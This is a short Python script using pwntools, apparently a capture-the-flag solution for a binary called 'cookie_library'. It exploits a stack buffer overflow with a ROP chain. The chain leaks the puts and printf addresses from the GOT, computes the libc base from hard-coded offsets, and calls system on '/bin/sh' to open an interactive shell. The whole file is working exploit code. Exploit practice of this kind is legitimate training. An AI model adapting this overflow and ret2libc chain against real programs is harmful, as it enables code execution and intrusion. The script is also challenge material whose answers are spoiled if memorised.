from pwn import *

r = process('./cookie_library')
raw_input('debug')

rop_rdi = 0x400933
puts_got = 0x600fb8
printf_got = 0x600fc8
puts_plt = 0x400640
printf_offset = 0x055810
system_offset = 0x0453a0
binsh_offset = 0x18ce17
main = 0x400797 

def func(rdi):
	buf = 'a'*0x58
	buf += p64(rop_rdi) + p64(rdi) + p64(puts_plt) + p64(main)
	r.sendlineafter('Which is the most tasty?', buf)
	r.recvuntil('be friends anymore\n')
	res = r.recv(6) + '\x00'*2
	leak = u64(res)
	return leak

puts_add = func(puts_got)
log.info('puts_add = %#x' %puts_add)

printf_add = func(printf_got)
log.info('printf_add = %#x' %printf_add)

libc_base = printf_add - printf_offset
system_add = system_offset + libc_base
binsh_add = binsh_offset + libc_base

buf = 'a'*0x58
buf += p64(rop_rdi) + p64(binsh_add) + p64(system_add) + p64(main)
r.sendlineafter('Which is the most tasty?', buf)

r.interactive()
r.close()

# FLAG